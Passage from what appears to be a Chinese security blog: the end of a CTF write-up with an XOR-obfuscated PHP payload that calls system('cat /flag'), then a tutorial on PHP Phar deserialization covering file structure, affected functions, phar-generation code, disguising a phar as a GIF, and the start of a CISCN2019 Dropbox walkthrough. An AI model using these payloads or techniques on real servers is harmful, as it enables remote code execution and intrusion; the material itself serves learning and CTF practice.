punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"^<span class="token interpolation"><span class="token variable">$i</span></span><span class="token interpolation"><span class="token variable">$j</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"==><span class="token interpolation"><span class="token variable">$exp</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>在打印出的结果中搜寻想要的字符串，找到最短的再组合</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token punctuation">(</span>is_nan<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span>tan<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token variable">$$pi</span><span class="token punctuation">;</span><span class="token variable">$pi</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre>

<ul>
<li><code>is_nan^(6).(4)  ==&gt;  _G</code></li>
<li><code>tan^(1).(5)  ==&gt;  ET</code></li>
<li>以上就和第一种方法类似，然后在传命令执行的代码就可以了</li>
</ul>
<p>参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></li>
<li><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a></li>
</ul>
<p>题目还是挺有意思的，如果再发现新方法再补上</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Phar反序列化浅析</title>
    <url>/posts/bb56c28a/</url>
    <content><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://xz.aliyun.com/t/2958#toc-2">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></li>
<li><a href="https://www.freebuf.com/articles/web/205943.html">PHAR反序列化拓展操作总结</a></li>
<li><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></li>
</ul>
<span id="more"></span>

<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><p><strong>①</strong>  <strong>a stub</strong></p>
<p>可以理解为一个标志，格式为<code>xxx</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<p><strong>②</strong>  <strong>a manifest describing the contents</strong></p>
<p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的<code>meta-data</code>，这是上述攻击手法最核心的地方。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124151781.png" alt loading="lazy"></p>
<p><strong>③</strong>  <strong>the file contents</strong></p>
<p>被压缩文件的内容。</p>
<p><strong>④</strong>  <strong>a signature for verifying Phar integrity (phar file format only)</strong></p>
<p>签名，放在文件末尾，格式如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124231445.png" alt loading="lazy"></p>
<p>通过<code>phar://</code>伪协议对一个<strong>phar</strong>文件进行了文件操作的时候，就可以触发反序列化，达到<strong>RCE</strong>的效果</p>
<h4 id="产生缘由"><a href="#产生缘由" class="headerlink" title="产生缘由"></a>产生缘由</h4><p>在<a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618">phar.c#L618</a>处，其调用了<code>php_var_unserialize</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120955832.png" alt loading="lazy"></p>
<p>因此可以构造一个特殊的phar包，使得代码能够反序列化，从而构造一个pop链，在使用<code>phar://</code>协议读取文件的时候，文件会被解析成phar (<a href="https://www.php.net/manual/zh/intro.phar.php">https://www.php.net/manual/zh/intro.phar.php</a>) 的过程会触发<code>php_var_unserialize</code>函数对<strong>meta-data</strong>的操作，造成反序列化。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>条件</strong></p>
<ul>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ul>
<p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120506980.png" alt loading="lazy"></p>
<ul>
<li><strong>exif</strong>：<code>exif_thumbnail</code>，<code>exif_imagetype</code></li>
<li><strong>gd</strong>：<code>imageloadfont</code>，<code>imagecreatefrom***</code></li>
<li><strong>hash</strong>：<code>hash_hmac_file</code>，<code>hash_file</code>，<code>hash_update_file</code>，<code>md5_file</code>，<code>sha1_file</code></li>
<li><strong>file/url</strong>：<code>get_meta_tags</code>，<code>get_headers</code></li>
<li><strong>standard</strong>：<code>getimagesize</code>，<code>getimagesizefromstring</code></li>
</ul>
<p><strong>zip</strong>：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'c.zip'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar://test.phar/test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>限制<code>phar://</code>不能出现在头几个字符，亦适用于<code>compress.zlib://</code>：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$z</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'compress.bzip2://phar:///home/sx/test.phar/test.txt'</span><span class="token punctuation">;</span></code></pre>

<p><strong><a href="https://baike.baidu.com/item/PostgreSQL/530240?fr=aladdin">PostgreSQL</a></strong>：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pgsql:host=%s;dbname=%s;user=%s;password=%s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"postgres"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"sx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">pgsqlCopyFromFile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'phar://test.phar/aa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p><code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样能使用的，需要开启<code>phar</code>的写功能。</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>生成<strong>phar</strong>文件：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>
    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
    <span class="token comment">//签名自动计算</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>notepad打开查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504131930692.png" alt loading="lazy"></p>
<p>明显的序列化存储</p>
<p>构造利用代码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Destruct called'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phar://phar.phar/a_random_string'</span><span class="token punctuation">;</span>
    <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>成功打印结果，当然这里换其他的文件操作函数也可以</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132140672.png" alt loading="lazy"></p>
<p><strong>将phar伪造成其他格式的文件</strong></p>
<p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub，增加gif文件头</span>
    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义meta-data存入manifest</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
    <span class="token comment">//签名自动计算</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>notepad打开查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132602458.png" alt loading="lazy"></p>
<p>和上面的一样可以利用成功</p>
<h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="CISCN2019-华北赛区-Day1-Web1-—Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-—Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]—Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]—Dropbox</h4><p>界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212154616.png" alt loading="lazy"></p>
<p>先随便注册一个账号登录，随后发现有上传文件和下载，删除文件的功能</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212308364.png" alt loading="lazy"></p>
<p>测试文件上传，只能上传那三种图片的格式，应该是有白名单，且文件上传后路径不可知，于是抓包测试文件下载和删除功能，其中文件下载处存在文件下载漏洞，于是将整个网站的源码都下载下来，测试后发现，后台在下载界面还是做了权限限制的，不然根目录下的<code>flag</code>就可以直接下下来了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212700778.png" alt loading="lazy"></p>
<p>有以下文件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504213252372.png" alt loading="lazy"></p>
<p>login.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>

.........(HTML)


<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'register'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('注册成功', 'info');&lt;/script>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$u</span><span class="token operator">-></span><span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span> <span class="token operator">.</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"sftUahRiTz"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>window.location.href='index.php';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('账号或密码错误', 'warning');&lt;/script>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>register.php</p>
<pre class="language-php" data-language="php"><code class="language-php">.........(HTML)


<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$u</span><span class="token operator">-></span><span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>window.location.href='login.php?register';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('此用户名已被使用', 'warning');&lt;/script>"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('请输入有效用户名和密码', 'warning');&lt;/script>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>upload.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
